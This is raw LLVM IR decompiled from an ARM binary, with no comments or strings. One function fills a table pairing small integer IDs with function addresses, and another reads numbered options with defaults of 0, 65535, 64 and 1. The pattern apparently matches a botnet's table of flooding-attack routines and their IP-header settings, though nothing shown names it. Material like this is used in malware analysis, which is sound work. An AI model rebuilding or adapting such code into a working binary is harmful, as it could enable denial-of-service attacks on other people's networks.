  store i32 %v2_867c, i32* %r3.global-to-local, align 4
  %v1_8684 = trunc i32 %v2_867c to i8
  %v2_8684 = load i32, i32* @r4, align 4
  %v3_8684 = inttoptr i32 %v2_8684 to i8*
  store i8 %v1_8684, i8* %v3_8684, align 1
  %v0_8688 = load i32, i32* %r2.global-to-local, align 4
  %v1_8688 = load i32, i32* @r6, align 4
  %v2_8688 = inttoptr i32 %v1_8688 to i32*
  store i32 %v0_8688, i32* %v2_8688, align 4
  %v2_868c = call i32 @function_1215c(i32 %v1_867c, i32 8)
  %v2_8690 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8690 = zext i8 %v2_8690 to i32
  store i32 ptrtoint (i32* @global_var_c18c.29 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_868c, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86a0 = load i32, i32* @r8, align 4
  %v2_86a0 = add i32 %v1_86a0, %v3_8690
  store i32 %v2_86a0, i32* %r1.global-to-local, align 4
  %v2_86a4 = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_86a8 = inttoptr i32 %v2_868c to i32*
  store i32 ptrtoint (i32* @global_var_c18c.29 to i32), i32* %v2_86a8, align 4
  %v3_86ac = load i32, i32* @r5, align 4
  %v4_86ac = add i32 %v3_86ac, 4
  %v5_86ac = inttoptr i32 %v4_86ac to i8*
  store i8 2, i8* %v5_86ac, align 1
  %v0_86b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86b0 = mul i32 %v0_86b0, 4
  store i32 %v3_86b0, i32* %r1.global-to-local, align 4
  %v5_86b4 = inttoptr i32 %v2_86a4 to i32*
  %v6_86b4 = call i32 @function_12290(i32* %v5_86b4, i32 %v3_86b0, i32 ptrtoint (i32* @global_var_c18c.29 to i32), i32 2)
  %v2_86b8 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_86b8 = zext i8 %v2_86b8 to i32
  store i32 %v3_86b8, i32* %r3.global-to-local, align 4
  store i32 %v6_86b4, i32* %r2.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r5, align 4
  %v5_86c0 = mul nuw nsw i32 %v3_86b8, 4
  %v6_86c0 = add i32 %v5_86c0, %v6_86b4
  %v7_86c0 = inttoptr i32 %v6_86c0 to i32*
  store i32 %v0_86c0, i32* %v7_86c0, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r8, align 4
  %v2_86c8 = add i32 %v1_86c8, %v0_86c8
  store i32 %v2_86c8, i32* %r3.global-to-local, align 4
  %v1_86d0 = load i32, i32* @r6, align 4
  %v2_86d0 = inttoptr i32 %v1_86d0 to i32*
  store i32 %v6_86b4, i32* %v2_86d0, align 4
  %v0_86d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_86d4 = trunc i32 %v0_86d4 to i8
  %v2_86d4 = load i32, i32* @r4, align 4
  %v3_86d4 = inttoptr i32 %v2_86d4 to i8*
  store i8 %v1_86d4, i8* %v3_86d4, align 1
  %v2_86d8 = call i32 @function_1215c(i32 %v1_86c8, i32 8)
  %v2_86dc = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_86dc = zext i8 %v2_86dc to i32
  store i32 ptrtoint (i32* @global_var_b5c8.31 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_86d8, i32* @r5, align 4
  %v1_86ec = load i32, i32* @r8, align 4
  %v2_86ec = add i32 %v1_86ec, %v3_86dc
  store i32 %v2_86ec, i32* %r1.global-to-local, align 4
  %v2_86f0 = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_86f4 = inttoptr i32 %v2_86d8 to i32*
  store i32 ptrtoint (i32* @global_var_b5c8.31 to i32), i32* %v2_86f4, align 4
  %v0_86f8 = load i32, i32* @r7, align 4
  %v1_86f8 = trunc i32 %v0_86f8 to i8
  %v2_86f8 = load i32, i32* @r5, align 4
  %v3_86f8 = add i32 %v2_86f8, 4
  %v4_86f8 = inttoptr i32 %v3_86f8 to i8*
  store i8 %v1_86f8, i8* %v4_86f8, align 1
  %v0_86fc = load i32, i32* %r1.global-to-local, align 4
  %v3_86fc = mul i32 %v0_86fc, 4
  store i32 %v3_86fc, i32* %r1.global-to-local, align 4
  %v4_8700 = inttoptr i32 %v2_86f0 to i32*
  %v5_8700 = call i32 @function_12290(i32* %v4_8700, i32 %v3_86fc, i32 %v6_86b4, i32 ptrtoint (i32* @global_var_b5c8.31 to i32))
  %v2_8704 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8704 = zext i8 %v2_8704 to i32
  store i32 %v3_8704, i32* %r3.global-to-local, align 4
  store i32 %v5_8700, i32* %r2.global-to-local, align 4
  %v0_870c = load i32, i32* @r5, align 4
  %v5_870c = mul nuw nsw i32 %v3_8704, 4
  %v6_870c = add i32 %v5_870c, %v5_8700
  %v7_870c = inttoptr i32 %v6_870c to i32*
  store i32 %v0_870c, i32* %v7_870c, align 4
  %v0_8710 = load i32, i32* @r7, align 4
  store i32 %v0_8710, i32* %r1.global-to-local, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = load i32, i32* @r8, align 4
  %v2_8714 = add i32 %v1_8714, %v0_8714
  store i32 %v2_8714, i32* %r3.global-to-local, align 4
  %v1_871c = trunc i32 %v2_8714 to i8
  %v2_871c = load i32, i32* @r4, align 4
  %v3_871c = inttoptr i32 %v2_871c to i8*
  store i8 %v1_871c, i8* %v3_871c, align 1
  %v0_8720 = load i32, i32* %r2.global-to-local, align 4
  %v1_8720 = load i32, i32* @r6, align 4
  %v2_8720 = inttoptr i32 %v1_8720 to i32*
  store i32 %v0_8720, i32* %v2_8720, align 4
  %v2_8724 = call i32 @function_1215c(i32 %v1_8714, i32 %v0_8710)
  %v2_8728 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8728 = zext i8 %v2_8728 to i32
  store i32 ptrtoint (i32* @global_var_af1c.33 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8724, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8738 = load i32, i32* @r8, align 4
  %v2_8738 = add i32 %v1_8738, %v3_8728
  store i32 %v2_8738, i32* %r1.global-to-local, align 4
  %v2_873c = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_8740 = inttoptr i32 %v2_8724 to i32*
  store i32 ptrtoint (i32* @global_var_af1c.33 to i32), i32* %v2_8740, align 4
  %v3_8744 = load i32, i32* @r5, align 4
  %v4_8744 = add i32 %v3_8744, 4
  %v5_8744 = inttoptr i32 %v4_8744 to i8*
  store i8 3, i8* %v5_8744, align 1
  %v0_8748 = load i32, i32* %r1.global-to-local, align 4
  %v3_8748 = mul i32 %v0_8748, 4
  store i32 %v3_8748, i32* %r1.global-to-local, align 4
  %v5_874c = inttoptr i32 %v2_873c to i32*
  %v6_874c = call i32 @function_12290(i32* %v5_874c, i32 %v3_8748, i32 ptrtoint (i32* @global_var_af1c.33 to i32), i32 3)
  %v2_8750 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8750 = zext i8 %v2_8750 to i32
  store i32 %v3_8750, i32* %r3.global-to-local, align 4
  store i32 %v6_874c, i32* %r2.global-to-local, align 4
  %v0_8758 = load i32, i32* @r5, align 4
  %v5_8758 = mul nuw nsw i32 %v3_8750, 4
  %v6_8758 = add i32 %v5_8758, %v6_874c
  %v7_8758 = inttoptr i32 %v6_8758 to i32*
  store i32 %v0_8758, i32* %v7_8758, align 4
  %v0_875c = load i32, i32* @r7, align 4
  store i32 %v0_875c, i32* %r1.global-to-local, align 4
  %v0_8760 = load i32, i32* %r3.global-to-local, align 4
  %v1_8760 = load i32, i32* @r8, align 4
  %v2_8760 = add i32 %v1_8760, %v0_8760
  store i32 %v2_8760, i32* %r3.global-to-local, align 4
  %v1_8768 = trunc i32 %v2_8760 to i8
  %v2_8768 = load i32, i32* @r4, align 4
  %v3_8768 = inttoptr i32 %v2_8768 to i8*
  store i8 %v1_8768, i8* %v3_8768, align 1
  %v0_876c = load i32, i32* %r2.global-to-local, align 4
  %v1_876c = load i32, i32* @r6, align 4
  %v2_876c = inttoptr i32 %v1_876c to i32*
  store i32 %v0_876c, i32* %v2_876c, align 4
  %v2_8770 = call i32 @function_1215c(i32 %v1_8760, i32 %v0_875c)
  %v2_8774 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8774 = zext i8 %v2_8774 to i32
  store i32 ptrtoint (i32* @global_var_a824.35 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8770, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_8784 = load i32, i32* @r8, align 4
  %v2_8784 = add i32 %v1_8784, %v3_8774
  store i32 %v2_8784, i32* %r1.global-to-local, align 4
  %v2_8788 = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_878c = inttoptr i32 %v2_8770 to i32*
  store i32 ptrtoint (i32* @global_var_a824.35 to i32), i32* %v2_878c, align 4
  %v3_8790 = load i32, i32* @r5, align 4
  %v4_8790 = add i32 %v3_8790, 4
  %v5_8790 = inttoptr i32 %v4_8790 to i8*
  store i8 4, i8* %v5_8790, align 1
  %v0_8794 = load i32, i32* %r1.global-to-local, align 4
  %v3_8794 = mul i32 %v0_8794, 4
  store i32 %v3_8794, i32* %r1.global-to-local, align 4
  %v5_8798 = inttoptr i32 %v2_8788 to i32*
  %v6_8798 = call i32 @function_12290(i32* %v5_8798, i32 %v3_8794, i32 ptrtoint (i32* @global_var_a824.35 to i32), i32 4)
  %v2_879c = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_879c = zext i8 %v2_879c to i32
  store i32 %v3_879c, i32* %r3.global-to-local, align 4
  store i32 %v6_8798, i32* %r2.global-to-local, align 4
  %v0_87a4 = load i32, i32* @r5, align 4
  %v5_87a4 = mul nuw nsw i32 %v3_879c, 4
  %v6_87a4 = add i32 %v5_87a4, %v6_8798
  %v7_87a4 = inttoptr i32 %v6_87a4 to i32*
  store i32 %v0_87a4, i32* %v7_87a4, align 4
  %v0_87a8 = load i32, i32* @r7, align 4
  store i32 %v0_87a8, i32* %r1.global-to-local, align 4
  %v0_87ac = load i32, i32* %r3.global-to-local, align 4
  %v1_87ac = load i32, i32* @r8, align 4
  %v2_87ac = add i32 %v1_87ac, %v0_87ac
  store i32 %v2_87ac, i32* %r3.global-to-local, align 4
  %v1_87b4 = trunc i32 %v2_87ac to i8
  %v2_87b4 = load i32, i32* @r4, align 4
  %v3_87b4 = inttoptr i32 %v2_87b4 to i8*
  store i8 %v1_87b4, i8* %v3_87b4, align 1
  %v0_87b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87b8 = load i32, i32* @r6, align 4
  %v2_87b8 = inttoptr i32 %v1_87b8 to i32*
  store i32 %v0_87b8, i32* %v2_87b8, align 4
  %v2_87bc = call i32 @function_1215c(i32 %v1_87ac, i32 %v0_87a8)
  %v2_87c0 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_87c0 = zext i8 %v2_87c0 to i32
  store i32 ptrtoint (i32* @global_var_a070.37 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87bc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_87d0 = load i32, i32* @r8, align 4
  %v2_87d0 = add i32 %v1_87d0, %v3_87c0
  store i32 %v2_87d0, i32* %r1.global-to-local, align 4
  %v2_87d4 = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_87d8 = inttoptr i32 %v2_87bc to i32*
  store i32 ptrtoint (i32* @global_var_a070.37 to i32), i32* %v2_87d8, align 4
  %v3_87dc = load i32, i32* @r5, align 4
  %v4_87dc = add i32 %v3_87dc, 4
  %v5_87dc = inttoptr i32 %v4_87dc to i8*
  store i8 5, i8* %v5_87dc, align 1
  %v0_87e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_87e0 = mul i32 %v0_87e0, 4
  store i32 %v3_87e0, i32* %r1.global-to-local, align 4
  %v5_87e4 = inttoptr i32 %v2_87d4 to i32*
  %v6_87e4 = call i32 @function_12290(i32* %v5_87e4, i32 %v3_87e0, i32 ptrtoint (i32* @global_var_a070.37 to i32), i32 5)
  %v2_87e8 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_87e8 = zext i8 %v2_87e8 to i32
  store i32 %v3_87e8, i32* %r3.global-to-local, align 4
  store i32 %v6_87e4, i32* %r2.global-to-local, align 4
  %v0_87f0 = load i32, i32* @r5, align 4
  %v5_87f0 = mul nuw nsw i32 %v3_87e8, 4
  %v6_87f0 = add i32 %v5_87f0, %v6_87e4
  %v7_87f0 = inttoptr i32 %v6_87f0 to i32*
  store i32 %v0_87f0, i32* %v7_87f0, align 4
  %v0_87f4 = load i32, i32* @r7, align 4
  store i32 %v0_87f4, i32* %r1.global-to-local, align 4
  %v0_87f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r8, align 4
  %v2_87f8 = add i32 %v1_87f8, %v0_87f8
  store i32 %v2_87f8, i32* %r3.global-to-local, align 4
  %v1_8800 = trunc i32 %v2_87f8 to i8
  %v2_8800 = load i32, i32* @r4, align 4
  %v3_8800 = inttoptr i32 %v2_8800 to i8*
  store i8 %v1_8800, i8* %v3_8800, align 1
  %v0_8804 = load i32, i32* %r2.global-to-local, align 4
  %v1_8804 = load i32, i32* @r6, align 4
  %v2_8804 = inttoptr i32 %v1_8804 to i32*
  store i32 %v0_8804, i32* %v2_8804, align 4
  %v2_8808 = call i32 @function_1215c(i32 %v1_87f8, i32 %v0_87f4)
  %v2_880c = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_880c = zext i8 %v2_880c to i32
  store i32 39100, i32* %r2.global-to-local, align 4
  store i32 %v2_8808, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_881c = load i32, i32* @r8, align 4
  %v2_881c = add i32 %v1_881c, %v3_880c
  store i32 %v2_881c, i32* %r1.global-to-local, align 4
  %v2_8820 = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_8824 = inttoptr i32 %v2_8808 to i32*
  store i32 39100, i32* %v2_8824, align 4
  %v3_8828 = load i32, i32* @r5, align 4
  %v4_8828 = add i32 %v3_8828, 4
  %v5_8828 = inttoptr i32 %v4_8828 to i8*
  store i8 10, i8* %v5_8828, align 1
  %v0_882c = load i32, i32* %r1.global-to-local, align 4
  %v3_882c = mul i32 %v0_882c, 4
  store i32 %v3_882c, i32* %r1.global-to-local, align 4
  %v5_8830 = inttoptr i32 %v2_8820 to i32*
  %v6_8830 = call i32 @function_12290(i32* %v5_8830, i32 %v3_882c, i32 39100, i32 10)
  %v2_8834 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8834 = zext i8 %v2_8834 to i32
  store i32 %v3_8834, i32* %r3.global-to-local, align 4
  store i32 %v6_8830, i32* %r2.global-to-local, align 4
  %v0_883c = load i32, i32* @r5, align 4
  %v5_883c = mul nuw nsw i32 %v3_8834, 4
  %v6_883c = add i32 %v5_883c, %v6_8830
  %v7_883c = inttoptr i32 %v6_883c to i32*
  store i32 %v0_883c, i32* %v7_883c, align 4
  %v0_8840 = load i32, i32* @r7, align 4
  store i32 %v0_8840, i32* %r1.global-to-local, align 4
  %v0_8844 = load i32, i32* %r3.global-to-local, align 4
  %v1_8844 = load i32, i32* @r8, align 4
  %v2_8844 = add i32 %v1_8844, %v0_8844
  store i32 %v2_8844, i32* %r3.global-to-local, align 4
  %v1_884c = trunc i32 %v2_8844 to i8
  %v2_884c = load i32, i32* @r4, align 4
  %v3_884c = inttoptr i32 %v2_884c to i8*
  store i8 %v1_884c, i8* %v3_884c, align 1
  %v0_8850 = load i32, i32* %r2.global-to-local, align 4
  %v1_8850 = load i32, i32* @r6, align 4
  %v2_8850 = inttoptr i32 %v1_8850 to i32*
  store i32 %v0_8850, i32* %v2_8850, align 4
  %v2_8854 = call i32 @function_1215c(i32 %v1_8844, i32 %v0_8840)
  %v2_8858 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8858 = zext i8 %v2_8858 to i32
  store i32 ptrtoint (i32* @global_var_9000.40 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8854, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_8868 = load i32, i32* @r8, align 4
  %v2_8868 = add i32 %v1_8868, %v3_8858
  store i32 %v2_8868, i32* %r1.global-to-local, align 4
  %v2_886c = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_8870 = inttoptr i32 %v2_8854 to i32*
  store i32 ptrtoint (i32* @global_var_9000.40 to i32), i32* %v2_8870, align 4
  %v3_8874 = load i32, i32* @r5, align 4
  %v4_8874 = add i32 %v3_8874, 4
  %v5_8874 = inttoptr i32 %v4_8874 to i8*
  store i8 6, i8* %v5_8874, align 1
  %v0_8878 = load i32, i32* %r1.global-to-local, align 4
  %v3_8878 = mul i32 %v0_8878, 4
  store i32 %v3_8878, i32* %r1.global-to-local, align 4
  %v5_887c = inttoptr i32 %v2_886c to i32*
  %v6_887c = call i32 @function_12290(i32* %v5_887c, i32 %v3_8878, i32 ptrtoint (i32* @global_var_9000.40 to i32), i32 6)
  %v2_8880 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8880 = zext i8 %v2_8880 to i32
  store i32 %v3_8880, i32* %r3.global-to-local, align 4
  store i32 %v6_887c, i32* %r2.global-to-local, align 4
  %v0_8888 = load i32, i32* @r5, align 4
  %v5_8888 = mul nuw nsw i32 %v3_8880, 4
  %v6_8888 = add i32 %v5_8888, %v6_887c
  %v7_8888 = inttoptr i32 %v6_8888 to i32*
  store i32 %v0_8888, i32* %v7_8888, align 4
  %v0_888c = load i32, i32* @r7, align 4
  store i32 %v0_888c, i32* %r1.global-to-local, align 4
  %v0_8890 = load i32, i32* %r3.global-to-local, align 4
  %v1_8890 = load i32, i32* @r8, align 4
  %v2_8890 = add i32 %v1_8890, %v0_8890
  store i32 %v2_8890, i32* %r3.global-to-local, align 4
  %v1_8898 = trunc i32 %v2_8890 to i8
  %v2_8898 = load i32, i32* @r4, align 4
  %v3_8898 = inttoptr i32 %v2_8898 to i8*
  store i8 %v1_8898, i8* %v3_8898, align 1
  %v0_889c = load i32, i32* %r2.global-to-local, align 4
  %v1_889c = load i32, i32* @r6, align 4
  %v2_889c = inttoptr i32 %v1_889c to i32*
  store i32 %v0_889c, i32* %v2_889c, align 4
  %v2_88a0 = call i32 @function_1215c(i32 %v1_8890, i32 %v0_888c)
  %v2_88a4 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_88a4 = zext i8 %v2_88a4 to i32
  store i32 ptrtoint (i32* @global_var_896c.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88a0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88b4 = load i32, i32* @r8, align 4
  %v2_88b4 = add i32 %v1_88b4, %v3_88a4
  store i32 %v2_88b4, i32* %r1.global-to-local, align 4
  %v2_88b8 = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_88bc = inttoptr i32 %v2_88a0 to i32*
  store i32 ptrtoint (i32* @global_var_896c.42 to i32), i32* %v2_88bc, align 4
  %v3_88c0 = load i32, i32* @r5, align 4
  %v4_88c0 = add i32 %v3_88c0, 4
  %v5_88c0 = inttoptr i32 %v4_88c0 to i8*
  store i8 7, i8* %v5_88c0, align 1
  %v0_88c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_88c4 = mul i32 %v0_88c4, 4
  store i32 %v3_88c4, i32* %r1.global-to-local, align 4
  %v5_88c8 = inttoptr i32 %v2_88b8 to i32*
  %v6_88c8 = call i32 @function_12290(i32* %v5_88c8, i32 %v3_88c4, i32 ptrtoint (i32* @global_var_896c.42 to i32), i32 7)
  %v2_88cc = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_88cc = zext i8 %v2_88cc to i32
  store i32 %v3_88cc, i32* %r3.global-to-local, align 4
  store i32 %v6_88c8, i32* %r2.global-to-local, align 4
  %v0_88d4 = load i32, i32* @r5, align 4
  %v5_88d4 = mul nuw nsw i32 %v3_88cc, 4
  %v6_88d4 = add i32 %v5_88d4, %v6_88c8
  %v7_88d4 = inttoptr i32 %v6_88d4 to i32*
  store i32 %v0_88d4, i32* %v7_88d4, align 4
  %v0_88d8 = load i32, i32* @r7, align 4
  store i32 %v0_88d8, i32* %r1.global-to-local, align 4
  %v0_88dc = load i32, i32* %r3.global-to-local, align 4
  %v1_88dc = load i32, i32* @r8, align 4
  %v2_88dc = add i32 %v1_88dc, %v0_88dc
  store i32 %v2_88dc, i32* %r3.global-to-local, align 4
  %v1_88e4 = trunc i32 %v2_88dc to i8
  %v2_88e4 = load i32, i32* @r4, align 4
  %v3_88e4 = inttoptr i32 %v2_88e4 to i8*
  store i8 %v1_88e4, i8* %v3_88e4, align 1
  %v0_88e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_88e8 = load i32, i32* @r6, align 4
  %v2_88e8 = inttoptr i32 %v1_88e8 to i32*
  store i32 %v0_88e8, i32* %v2_88e8, align 4
  %v2_88ec = call i32 @function_1215c(i32 %v1_88dc, i32 %v0_88d8)
  %v2_88f0 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_88f0 = zext i8 %v2_88f0 to i32
  store i32 ptrtoint (i32* @global_var_961c.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88ec, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8900 = load i32, i32* @r8, align 4
  %v2_8900 = add i32 %v1_8900, %v3_88f0
  store i32 %v2_8900, i32* %r1.global-to-local, align 4
  %v2_8904 = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_8908 = inttoptr i32 %v2_88ec to i32*
  store i32 ptrtoint (i32* @global_var_961c.44 to i32), i32* %v2_8908, align 4
  %v3_890c = load i32, i32* @r5, align 4
  %v4_890c = add i32 %v3_890c, 4
  %v5_890c = inttoptr i32 %v4_890c to i8*
  store i8 9, i8* %v5_890c, align 1
  %v0_8910 = load i32, i32* %r1.global-to-local, align 4
  %v3_8910 = mul i32 %v0_8910, 4
  store i32 %v3_8910, i32* %r1.global-to-local, align 4
  %v5_8914 = inttoptr i32 %v2_8904 to i32*
  %v6_8914 = call i32 @function_12290(i32* %v5_8914, i32 %v3_8910, i32 ptrtoint (i32* @global_var_961c.44 to i32), i32 9)
  %v2_8918 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8918 = zext i8 %v2_8918 to i32
  store i32 %v3_8918, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r6, align 4
  %v2_891c = inttoptr i32 %v1_891c to i32*
  store i32 %v6_8914, i32* %v2_891c, align 4
  %v0_8920 = load i32, i32* @r5, align 4
  %v2_8920 = load i32, i32* %r3.global-to-local, align 4
  %v5_8920 = mul i32 %v2_8920, 4
  %v6_8920 = add i32 %v5_8920, %v6_8914
  %v7_8920 = inttoptr i32 %v6_8920 to i32*
  store i32 %v0_8920, i32* %v7_8920, align 4
  %v0_8924 = load i32, i32* %r3.global-to-local, align 4
  %v1_8924 = load i32, i32* @r8, align 4
  %v2_8924 = add i32 %v1_8924, %v0_8924
  store i32 %v2_8924, i32* %r2.global-to-local, align 4
  %v1_892c = trunc i32 %v2_8924 to i8
  %v2_892c = load i32, i32* @r4, align 4
  %v3_892c = inttoptr i32 %v2_892c to i8*
  store i8 %v1_892c, i8* %v3_892c, align 1
  %v2_8930 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8930, i32* @r4, align 4
  store i32 %v6_85e0, i32* @r5, align 4
  store i32 %v9_85e0, i32* @r6, align 4
  store i32 %v12_85e0, i32* @r7, align 4
  store i32 %v15_85e0, i32* @r8, align 4
  ret i32 %v1_8924

; uselistorder directives
  uselistorder i32 %v1_8924, { 1, 0 }
  uselistorder i32 %v3_8910, { 1, 0 }
  uselistorder i32 %v1_88dc, { 1, 0 }
  uselistorder i32 %v3_88c4, { 1, 0 }
  uselistorder i32 %v1_8890, { 1, 0 }
  uselistorder i32 %v3_8878, { 1, 0 }
  uselistorder i32 %v1_8844, { 1, 0 }
  uselistorder i32 %v3_882c, { 1, 0 }
  uselistorder i32 %v1_87f8, { 1, 0 }
  uselistorder i32 %v3_87e0, { 1, 0 }
  uselistorder i32 %v1_87ac, { 1, 0 }
  uselistorder i32 %v3_8794, { 1, 0 }
  uselistorder i32 %v1_8760, { 1, 0 }
  uselistorder i32 %v3_8748, { 1, 0 }
  uselistorder i32 %v1_8714, { 1, 0 }
  uselistorder i32 %v3_86fc, { 1, 0 }
  uselistorder i32 %v1_86c8, { 1, 0 }
  uselistorder i32 %v6_86b4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86b0, { 1, 0 }
  uselistorder i32 %v1_867c, { 1, 0 }
  uselistorder i32 %v3_8664, { 1, 0 }
  uselistorder i32 %v2_8640, { 1, 0 }
  uselistorder i32 %v6_861c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8618, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 43, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i8* bitcast (i8** @global_var_1e9d0.17 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_1e9d1.25 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1e9d4.19, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
}

define i32 @function_896c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_896c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_896c = load i32, i32* @r4, align 4
  %v6_896c = load i32, i32* @r5, align 4
  %v24_896c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_8988 = call i32 @function_1215c(i32 %arg1, i32 4)
  %v0_898c = load i32, i32* @r5, align 4
  store i32 %v0_898c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_899c = load i32, i32* @r4, align 4
  store i32 %v0_899c, i32* %r0.global-to-local, align 4
  %v5_89a0 = inttoptr i32 %v0_898c to i32*
  %v6_89a0 = call i32 @function_8570(i32 %v0_899c, i32* %v5_89a0, i32 2, i32 0, i32 %v2_8988)
  %v1_89ac = urem i32 %v6_89a0, 256
  store i32 %v1_89ac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_89b8 = load i32, i32* @r5, align 4
  store i32 %v0_89b8, i32* %r1.global-to-local, align 4
  %v0_89bc = load i32, i32* @r4, align 4
  store i32 %v0_89bc, i32* %r0.global-to-local, align 4
  %v5_89c0 = trunc i32 %v6_89a0 to i8
  %v6_89c4 = inttoptr i32 %v0_89b8 to i32*
  %v7_89c4 = call i32 @function_8570(i32 %v0_89bc, i32* %v6_89c4, i32 3, i32 65535, i32 %v6_89a0)
  %v0_89c8 = load i32, i32* @r5, align 4
  store i32 %v0_89c8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_89c4, i32* %fp.global-to-local, align 4
  %v0_89d8 = load i32, i32* @r4, align 4
  store i32 %v0_89d8, i32* %r0.global-to-local, align 4
  %v5_89dc = inttoptr i32 %v0_89c8 to i32*
  %v6_89dc = call i32 @function_8570(i32 %v0_89d8, i32* %v5_89dc, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_89e4 = urem i32 %v6_89dc, 256
  store i32 %v1_89e4, i32* %ip.global-to-local, align 4
  %v0_89e8 = load i32, i32* @r5, align 4
  store i32 %v0_89e8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_89f4 = load i32, i32* @r4, align 4
